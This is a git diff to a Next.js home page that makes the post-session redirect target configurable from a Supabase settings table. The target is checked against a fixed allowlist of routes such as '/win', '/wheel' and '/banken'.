@@ -2,6 +2,25 @@ import { redirect } from "next/navigation";
 import { headers } from "next/headers";
 import { createSessionAction } from "@/app/actions/create-session";
 import { buildShareMetadata } from "@/lib/share-metadata";
+import { createServerSupabaseClient } from "@/lib/supabase/server";
+
+const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];
+
+async function getEntryPage(): Promise<string> {
+  try {
+    const supabase = await createServerSupabaseClient();
+    if (!supabase) return "/win";
+    const { data } = await supabase
+      .from("global_settings")
+      .select("entry_page")
+      .limit(1)
+      .maybeSingle();
+    const raw = typeof data?.entry_page === "string" ? data.entry_page.trim() : "";
+    return ALLOWED_ENTRY_PAGES.includes(raw) ? raw : "/win";
+  } catch {
+    return "/win";
+  }
+}
 
 export const dynamic = "force-dynamic";
 
@@ -68,5 +87,6 @@ export default async function Home({ searchParams }: Props) {
     ? String(result.data.public_id)
     : sessionId;
 
-  redirect(`/win?session=${encodeURIComponent(routeSessionId)}`);
+  const entryPage = await getEntryPage();
+  redirect(`${entryPage}?session=${encodeURIComponent(routeSessionId)}`);
 }
